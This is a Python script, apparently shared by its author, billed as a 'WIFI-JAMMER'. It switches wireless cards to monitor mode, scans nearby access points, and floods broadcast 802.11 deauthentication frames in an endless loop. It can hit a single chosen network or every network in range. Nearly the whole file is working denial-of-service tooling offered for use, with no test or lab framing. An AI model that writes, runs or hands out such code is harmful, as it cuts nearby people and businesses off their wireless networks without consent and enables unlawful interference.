import os
import subprocess
import sys
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, Dot11Beacon, Dot11Elt

# Define green color for text
GREEN = "\033[92m"
RESET = "\033[0m"

def display_ascii_art():
    # Generate ASCII art using toilet and format it
    ascii_art = subprocess.run(
        ['toilet', '-f', 'bigmono12', '-w', str(os.get_terminal_size().columns), 'WIFI-JAMMER'],
        capture_output=True, text=True
    ).stdout

    # Add indentation and color (bold green)
    ascii_art = GREEN + ascii_art.replace("\n", "\n      ") + RESET

    # Display the ASCII art
    print(ascii_art)

def display_details():
    """
    Display your details in a centered and presentable format.
    """
    # Define the text to display
    details = [
        "GitHub: dy-glitch | Instagram: gangnapper",
        "Kindly follow my channel!",
        "Have fun and a blessed day! 🎉🙏"
    ]

    # Define the width of the display (adjust as needed)
    width = 60

    # Print a decorative border
    print("\n" + "=" * width)

    # Print each line centered
    for line in details:
        print(line.center(width))

    # Print another decorative border
    print("=" * width + "\n")

def get_wireless_interfaces():
    """
    Get a list of all wireless interfaces.
    """
    interfaces = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
    interfaces = [line.split()[0] for line in interfaces.splitlines() if "IEEE 802.11" in line]
    return interfaces

def set_monitor_mode(interface):
    """
    Set the given interface to monitor mode.
    """
    print(f"{GREEN}[*] Setting {interface} to monitor mode...{RESET}")
    try:
        # Bring the interface down
        subprocess.run(["sudo", "ifconfig", interface, "down"], check=True)
        # Set monitor mode
        subprocess.run(["sudo", "iwconfig", interface, "mode", "monitor"], check=True)
        # Bring the interface up
        subprocess.run(["sudo", "ifconfig", interface, "up"], check=True)
        print(f"{GREEN}[+] {interface} is now in monitor mode.{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{GREEN}[-] Failed to set {interface} to monitor mode: {e}{RESET}")
        sys.exit(1)

def set_all_interfaces_to_monitor_mode():
    """
    Set all wireless interfaces to monitor mode.
    """
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print(f"{GREEN}[-] No wireless interfaces found.{RESET}")
        sys.exit(1)

    for interface in interfaces:
        set_monitor_mode(interface)

def scan_wifi(interface):
    """
    Scan for Wi-Fi networks and return a list of BSSIDs.
    """
    print(f"{GREEN}[*] Scanning for Wi-Fi networks on {interface}...{RESET}")
    networks = set()

    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            bssid = packet[Dot11].addr2
            ssid = packet[Dot11Elt].info.decode() if packet[Dot11Elt].info else "<hidden>"
            networks.add((bssid, ssid))

    # Start sniffing for 10 seconds
    sniff(iface=interface, prn=packet_handler, timeout=10)

    if not networks:
        print(f"{GREEN}[-] No Wi-Fi networks found.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[+] Available Wi-Fi networks:{RESET}")
    for i, (bssid, ssid) in enumerate(networks):
        print(f"{GREEN}  {i + 1}. BSSID: {bssid}, SSID: {ssid}{RESET}")

    return [bssid for bssid, _ in networks]

def deauthenticate_all(interface, bssids):
    print(f"{GREEN}[*] Starting persistent deauthentication attack...{RESET}")
    try:
        while True:
            for bssid in bssids:
                print(f"{GREEN}[*] Deauthenticating network with BSSID: {bssid}{RESET}")
                sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), iface=interface, count=100, inter=0.01, verbose=False)
            time.sleep(1)  # Wait before repeating
    except KeyboardInterrupt:
        print(f"\n{GREEN}[*] Stopping deauthentication attack.{RESET}")

def deauthenticate_single(interface, bssid):
    """
    Deauthenticate a single Wi-Fi network persistently.
    """
    print(f"{GREEN}[*] Starting persistent deauthentication attack on BSSID: {bssid}{RESET}")
    try:
        while True:
            sendp(RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7), iface=interface, count=100, inter=0.01, verbose=False)
            time.sleep(1)  # Wait before repeating
    except KeyboardInterrupt:
        print(f"\n{GREEN}[*] Stopping deauthentication attack.{RESET}")

def main():
    # Display the ASCII art
    display_ascii_art()

    # Display your details
    display_details()

    # List available interfaces
    interfaces = get_wireless_interfaces()
    if not interfaces:
        print(f"{GREEN}[-] No wireless interfaces found.{RESET}")
        sys.exit(1)

    print(f"{GREEN}[*] Available interfaces:{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{GREEN}  {i + 1}. {iface}{RESET}")

    # Ask if the user wants to set all interfaces to monitor mode
    monitor_mode = input(f"{GREEN}[*] Do you want to set all wireless interfaces to monitor mode? (yes/no): {RESET}").strip().lower()
    if monitor_mode == "yes":
        set_all_interfaces_to_monitor_mode()
    elif monitor_mode != "no":
        print(f"{GREEN}[-] Invalid choice. Exiting.{RESET}")
        sys.exit(1)

    # Choose interface for scanning and deauthentication
    try:
        iface_choice = int(input(f"{GREEN}[*] Choose an interface (1-{len(interfaces)}): {RESET}")) - 1
        if iface_choice not in range(len(interfaces)):
            print(f"{GREEN}[-] Invalid choice. Exiting.{RESET}")
            sys.exit(1)
        interface = interfaces[iface_choice]
    except ValueError:
        print(f"{GREEN}[-] Invalid input. Exiting.{RESET}")
        sys.exit(1)

    # Scan for Wi-Fi networks
    bssids = scan_wifi(interface)

    # Choose deauthentication mode
    mode = input(f"{GREEN}[*] Do you want to deauthenticate all Wi-Fi networks or a single Wi-Fi network? (all/single): {RESET}").strip().lower()
    
    if mode == "all":
        deauthenticate_all(interface, bssids)
    elif mode == "single":
        bssid = input(f"{GREEN}[*] Enter the BSSID of the target network (e.g., 00:11:22:33:44:55): {RESET}").strip()
        if not bssid:
            print(f"{GREEN}[-] BSSID cannot be empty. Exiting.{RESET}")
            sys.exit(1)
        deauthenticate_single(interface, bssid)
    else:
        print(f"{GREEN}[-] Invalid choice. Please choose 'all' or 'single'.{RESET}")

if __name__ == "__main__":
    # Ensure the script is run with sudo
    if os.geteuid() != 0:
        print(f"{GREEN}[-] This script must be run as root. Use 'sudo'.{RESET}")
        sys.exit(1)
    main()
